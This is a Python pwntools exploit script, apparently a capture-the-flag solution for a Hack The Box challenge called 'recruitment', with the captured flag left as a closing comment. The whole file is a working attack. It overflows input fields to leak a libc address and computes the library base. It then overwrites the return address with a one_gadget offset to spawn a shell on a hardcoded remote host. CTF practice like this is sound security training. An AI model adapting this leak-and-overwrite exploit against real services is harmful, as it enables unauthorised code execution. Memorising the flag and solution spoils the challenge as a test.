#!/usr/bin/env python3

from pwn import *

exe = ELF("./recruitment_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.50.242", 35024)

    return r


def main():
    r = conn()
    input()
    # good luck pwning :)
    r.sendlineafter(b'$ ', b'1')
    r.sendlineafter(b'Name:  ', b'A')
    r.sendlineafter(b'Class: ', b'A'*16)
    r.sendlineafter(b'Age:   ', b'A'* 24)
    r.recvuntil(b'Age:   AAAAAAAAAAAAAAAAAAAAAAAA\n')
    pause()
    leak = u64(r.recv(5) + b'\0\0\0')
    leak = leak << 8
    libc.address = leak - 0x93b00
    info('Libc leak: ' + hex(leak))
    info('Libc: ' + hex(libc.address))
    system = libc.sym['system']
    binsh = next(libc.search('/bin/sh'))
    info('System: ' + hex(system))
    one_gadget = libc.address + 0x583e3
    pause()
    r.sendlineafter(b'$ ', b'3')
    r.sendlineafter(b'mission: ', b'A'*0x28+ p64(one_gadget))
    pause()
    r.interactive()


if __name__ == "__main__":
    main()
# HTB{R34dy_0R_n0t_w3_4r3_c0m1ng_3db8647580a5f8902b7653c8b0e7063a}